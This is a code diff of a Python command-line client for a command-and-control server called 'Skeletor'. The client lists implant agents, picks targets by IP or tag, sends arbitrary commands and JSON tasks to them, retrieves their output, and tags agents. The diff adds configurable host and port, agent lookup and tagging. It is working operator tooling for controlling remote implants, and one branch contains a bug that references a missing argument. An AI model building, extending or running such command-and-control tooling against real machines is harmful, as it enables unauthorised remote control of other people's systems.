@@ -4,6 +4,9 @@ import argparse
 import requests
 import json
 
+SKELETOR_IP = "localhost"
+SKELETOR_PORT = "80"
+
 
 def arg_setup():
     msg = "Command line tool for interaction with Skeletor C2 server running on localhost"
@@ -12,7 +15,8 @@ def arg_setup():
 
     # 'get' command
     get_parser = subparsers.add_parser("get", help="Get resources")
-    get_parser.add_argument("resource", help="Resource to retrieve", choices=['agents','targets'])
+    get_parser.add_argument("resource", help="Resource to retrieve", choices=['agents','targets',"agent","tagged"])
+    get_parser.add_argument("arg",nargs="?",help="Agent ID (if resource == 'agent') or Tag Name (if resource == 'tagged')")
     get_parser.set_defaults(verb='get')
     # 'cmd' command
     cmd_parser = subparsers.add_parser("cmd", help="Command agents")
@@ -27,10 +31,15 @@ def arg_setup():
     #set targets
     set_parser = subparsers.add_parser("set", help="Set information")
     set_parser.add_argument("resource", help="Resource to set", choices=['targets'])
-    set_parser.add_argument("ips", help="IPs to set as targets (entered as comma separated list)")
+    set_parser.add_argument("mode", help="How to set targets", choices=['ips','tagged'])
+    set_parser.add_argument("value", help="IPs (comma separated) or tag name")
     #result command
     result_parser = subparsers.add_parser("result", help="Get results")
     result_parser.add_argument("agent_id", help="ID of agent to get results from")
+    #tag command
+    tag_parser = subparsers.add_parser("tag", help="Tag an agent")
+    tag_parser.add_argument("agent_id", help="ID of agent to tag")
+    tag_parser.add_argument("tags", help="tag(s) to give agent (if multiple supply as a comma seperated list)")
     
     return parser.parse_args()
 
@@ -39,44 +48,84 @@ def main():
     
     if args.verb == 'get':
         if args.resource == 'agents':
-            agents = requests.get("http://localhost:80/get-agents").json()
+            agents = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agents").json()
             for agent in agents: 
                 print(agent.get('agent_id') + " - " + agent.get('status'))
         elif args.resource == 'targets':
-            targets = requests.get("http://localhost:80/targets").text.split("\n")
+            targets = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/targets").text.split("\n")
             for target in targets: 
                 print(target)
+        elif args.resource == "agent":
+            if not args.arg:
+                raise SyntaxError("Missing agent_id")
+            data = {"agent_id":args.arg}
+            agent_info = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-agent",json=data).json()
+            print("Agent ID:",args.agent_id)
+            print("Status:",agent_info["status"])
+            print("Targeted:",agent_info["targeted"])
+            print("Callbacks:",agent_info["callbacks"])
+            print("Last Seen:",agent_info["last_seen"])
+            print("Last Command:",agent_info["last_command"])
+            print("Last Result:",agent_info["last_result"])
+        elif args.resource == "tagged":
+            data = {"tag":args.arg}
+            tagged = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged",json=data).json()["agents"]
+            print(f"Agents with tag '{args.arg}':")
+            for agent in tagged:
+                print("\t"+agent)
         else:
             print("Invalid resource type for get command")
     elif args.verb == 'cmd':
         #print("cmd = " + args.cmd)
-        for target in requests.get("http://localhost:80/targets").text.split("\n"):
+        for target in requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/targets").text.split("\n"):
             if target.strip() != "":
                 data = {'agent_id': target, 'action': 'command', 'command': args.cmd}
-                requests.post("http://localhost:80/make-task", json=data)
+                requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=data)
     elif args.verb == 'clear':
         if args.resource == 'targets':
-            requests.post("http://localhost:80/clear-targets")
+            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/clear-targets")
         else:
             print("Invalid resource type for clear command")
     elif args.verb == 'post':
         json_data = json.load(open(args.json_file))
-        targets = requests.get("http://localhost:80/targets").text.split("\n")
+        targets = requests.get(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/targets").text.split("\n")
         for target in targets:
             json_data['agent_id'] = target
-            requests.post("http://localhost:80/make-task", json=json_data)
+            requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/make-task", json=json_data)
     elif args.verb == 'set':
         if args.resource == 'targets':
-            ips = args.ips.split(",")
-            data = {"ips": ips}
-            requests.post("http://localhost:80/set-targets", json=data)
+            if args.mode == "ips":
+                ips = args.value.split(",")
+                data = {"ips": ips}
+                requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/set-targets", json=data)
+            elif args.mode == "tagged":
+                tag_data = {"tag": args.value}
+                resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tagged", json=tag_data).json()
+                if "agents" not in resp:
+                    print(f"Error: {resp.get('error', 'unknown error')}")
+                else:
+                    agent_ids = resp["agents"]
+                    if not agent_ids:
+                        print(f"No agents found with tag '{args.value}'")
+                    else:
+                        data = {"ips": agent_ids}
+                        requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/set-targets", json=data)
+                        print(f"Set {len(agent_ids)} agents as targets (tag = {args.value})")
         else:
             print("Invalid resource type for set command")
     elif args.verb in ["result","results"]:
         data = {"agent_id": args.agent_id}
-        result = requests.post("http://localhost:80/get-result", json=data).json()
+        result = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/get-result", json=data).json()
         result_str = "\n" + "Agent: " + args.agent_id + "\n" + "Command: " + result.get('command') + "\n" + "Result: " + result.get('result') + "\n"
         print(result_str)
+    elif args.verb == "tag":
+        data = {"agent_id": args.agent_id,"tags": args.tags}
+        print(data)
+        resp = requests.post(f"http://{SKELETOR_IP}:{SKELETOR_PORT}/tag-agent", json=data)
+        jason = resp.json()
+        print(f"Agent {jason['agent_id']} tagged")
+        print(f"Added tags: {', '.join(jason['added_tags']) if jason['added_tags'] else 'None'}")
+        print(f"All tags: {', '.join(jason['all_tags'])}")
     else:
         print("Missing agent ID")
 
